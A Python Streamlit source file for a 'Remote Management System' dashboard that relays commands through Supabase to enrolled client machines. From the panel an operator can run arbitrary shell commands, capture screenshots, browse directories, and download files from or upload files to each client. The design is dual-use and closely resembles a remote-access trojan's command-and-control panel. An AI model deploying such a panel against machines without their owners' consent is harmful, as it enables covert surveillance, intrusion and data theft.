import streamlit as st
from st_on_hover_tabs import on_hover_tabs
from streamlit_lottie import st_lottie
from supabase import create_client
from datetime import datetime, timezone
import base64
from PIL import Image
import io
import time
import json
import requests

supabase_url = st.secrets["url"]
supabase_api_key = st.secrets["api_key"]

# Initialize Supabase securely
supabase = create_client(supabase_url, supabase_api_key)

# Page Configuration
st.set_page_config(
    page_title="Remote Management System",
    page_icon="🖥️",
    layout="wide"
)

# Optional: Import external CSS for additional styling
try:
    with open("style.css") as f:
        st.markdown('<style>' + f.read() + '</style>', unsafe_allow_html=True)
except Exception:
    pass

# Custom CSS (inline)
st.markdown("""
<style>
    .client-card {
        background-color: #1E1E1E;
        border: 1px solid #00FF00;
        border-radius: 15px;
        padding: 20px;
        margin: 15px 0;
        cursor: pointer;
        transition: transform 0.2s;
    }
    .client-card:hover {
        transform: scale(1.02);
    }
    .status-online {
        color: #00FF00;
        font-weight: bold;
    }
    .status-offline {
        color: #FF0000;
        font-weight: bold;
    }
    .header-title {
        font-size: 2.5rem;
        font-weight: bold;
        color: #00FF00;
        text-align: center;
        margin-bottom: 20px;
    }
    .subheader {
        font-size: 1.5rem;
        color: #CCCCCC;
        margin-bottom: 10px;
    }
    /* Override default sidebar background */
    .css-1d391kg {  
        background-color: #111;
    }
</style>
""", unsafe_allow_html=True)

# Helper Functions
def decode_image(base64_string: str) -> Image.Image:
    try:
        img_bytes = base64.b64decode(base64_string)
        return Image.open(io.BytesIO(img_bytes))
    except Exception as e:
        st.error(f"Error decoding image: {e}")
        return None

def get_client_status(last_seen: str) -> str:
    try:
        last_seen_time = datetime.fromisoformat(last_seen.replace('Z', '+00:00'))
        time_diff = datetime.now(timezone.utc) - last_seen_time
        return "online" if time_diff.total_seconds() < 60 else "offline"
    except Exception:
        return "unknown"

def send_command(client_id: str, command: str):
    try:
        data = {
            "client_id": client_id,
            "type": "command",
            "content": command,
            "status": "pending",
        }
        supabase.table('messages').insert(data).execute()
        return True
    except Exception as e:
        st.error(f"Error sending command: {e}")
        return False

def load_lottieurl(url: str):
    r = requests.get(url)
    if r.status_code != 200:
        return None
    return r.json()

# --- Dashboard Functions for a Selected Client ---
def show_command_center(selected_client):
    st.header("Command Center")
    with st.form("command_form"):
        command = st.text_input("Enter Command", placeholder="Type your command here")
        if st.form_submit_button("Execute"):
            if command:
                if send_command(selected_client, f"cmd {command}"):
                    st.success("Command sent successfully!")

def show_screenshot(selected_client):
    st.header("Screenshot")
    if st.button("Capture Screenshot"):
        if send_command(selected_client, "get image"):
            st.success("Screenshot request sent!")
            time.sleep(2)

def show_file_manager(selected_client):
    st.header("File Manager")
    fm_tabs = st.tabs(["List Files", "Download File", "Upload File"])
    
    with fm_tabs[0]:
        st.subheader("List Files")
        directory = st.text_input("Directory", value=".")
        if st.button("List Files"):
            command = f"file list {directory}"
            if send_command(selected_client, command):
                st.success("List Files command sent!")
    
    with fm_tabs[1]:
        st.subheader("Download File")
        filepath = st.text_input("File path to download")
        if st.button("Download File"):
            command = f"file get {filepath}"
            if send_command(selected_client, command):
                st.success("Download command sent! Check Message History for file data.")
    
    with fm_tabs[2]:
        st.subheader("Upload File")
        uploaded_file = st.file_uploader("Choose a file to upload")
        destination = st.text_input("Destination path on client", value="C:/destination/")
        if st.button("Upload File"):
            if uploaded_file and destination:
                file_bytes = uploaded_file.read()
                file_b64 = base64.b64encode(file_bytes).decode()
                payload = json.dumps({
                    "destination": destination + uploaded_file.name,
                    "content": file_b64
                })
                command = f"file upload {payload}"
                if send_command(selected_client, command):
                    st.success("Upload command sent!")
            else:
                st.error("Please select a file and specify a destination.")

def show_message_history(selected_client):
    st.header("Message History")
    if st.button("Refresh Messages"):
        messages = supabase.table('messages')\
            .select('*')\
            .eq('client_id', selected_client)\
            .order('created_at', desc=True)\
            .limit(50)\
            .execute()
            
        for msg in messages.data:
            with st.expander(
                f"{msg['type'].upper()} - {msg['created_at']}",
                expanded=False
            ):
                if msg['type'] == 'text':
                    st.code(msg['content'], language='bash')
                elif msg['type'] == 'image':
                    img = decode_image(msg['content'])
                    if img:
                        st.image(img)
                elif msg['type'] == 'file':
                    try:
                        file_info = json.loads(msg['content'])
                        filename = file_info.get("filename", "downloaded_file")
                        file_b64 = file_info.get("content", "")
                        file_bytes = base64.b64decode(file_b64)
                        st.download_button("Download File", file_bytes, file_name=filename)
                    except Exception as e:
                        st.error(f"Error processing file message: {e}")
                st.text(f"Status: {msg['status']}")

def show_client_dashboard(selected_client):
    st.markdown(f"<div class='header-title'>Dashboard for Client: {selected_client}</div>", unsafe_allow_html=True)
    tabs = st.tabs(["Command", "Screenshot", "Files", "History"])
    with tabs[0]:
        show_command_center(selected_client)
    with tabs[1]:
        show_screenshot(selected_client)
    with tabs[2]:
        show_file_manager(selected_client)
    with tabs[3]:
        show_message_history(selected_client)

# --- Home Screen: Show All Clients as Clickable Cards ---
def show_home():
    st.markdown("<div class='header-title'>Remote Management System</div>", unsafe_allow_html=True)
    st.write("Click on a client below to manage it:")

    # Get all clients from Supabase
    clients = supabase.table('clients')\
            .select('*')\
            .order('last_seen', desc=True)\
            .execute()

    if not clients.data:
        st.warning("No clients connected")
        return

    # Use columns to layout client cards (adjust number of columns as needed)
    cols = st.columns(3)
    for idx, c in enumerate(clients.data):
        status = get_client_status(c['last_seen'])
        card_html = f"""
        <div class="client-card" id="{c['client_id']}" style="padding: 20px;">
            <h3>{c['hostname']}</h3>
            <p><strong>ID:</strong> {c['client_id']}</p>
            <p><strong>OS:</strong> {c['os']}</p>
            <p><strong>IP:</strong> {c['ip_address']}</p>
            <p><strong>Status:</strong> <span class="status-{status}">{status.upper()}</span></p>
            <p><strong>Last Seen:</strong> {c['last_seen']}</p>
        </div>"""
        # Use a button for each card. When clicked, store selected client in session_state.
        if cols[idx % 3].markdown(card_html, unsafe_allow_html=True):
            pass
        # Because st.markdown is not clickable by default, we add a button below each card.
        if cols[idx % 3].button("Manage", key=c['client_id']):
            st.session_state["selected_client"] = c['client_id']


    # Optionally display a Lottie animation on the home screen
    lottie_animation = load_lottieurl("https://assets3.lottiefiles.com/packages/lf20_yp2m9iwx.json")
    if lottie_animation:
        st_lottie(lottie_animation, height=300)

# --- Main Routing ---
if "selected_client" not in st.session_state:
    st.session_state["selected_client"] = None

# Sidebar Navigation using On Hover Tabs (when a client is selected)
with st.sidebar:
    tabs = on_hover_tabs(
        tabName=['Home', 'Dashboard'],
        iconName=['home', 'dashboard'],
        default_choice=0,
        styles={
            'navtab': {
                'background-color': '#111',
                'color': '#818181',
                'font-size': '18px',
                'transition': '.3s',
                'white-space': 'nowrap',
                'text-transform': 'uppercase'
            },
            'tabOptionsStyle': {':hover :hover': {'color': 'red', 'cursor': 'pointer'}},
            'iconStyle': {'position': 'fixed', 'left': '7.5px', 'text-align': 'left'},
            'tabStyle': {'list-style-type': 'none', 'margin-bottom': '30px', 'padding-left': '30px'}
        },
        key="main_nav"
    )

# Main UI Routing
if tabs == "Home" or st.session_state["selected_client"] is None:
    # Show the home screen with the list of clients
    show_home()
else:
    # A client has been selected. Show a "Back" button to return to the home screen.
    # st.sidebar.button("Back to Home", key="back", on_click=lambda: st.session_state.update({"selected_client": None}))
    # Show dashboard for the selected client
    show_client_dashboard(st.session_state["selected_client"])
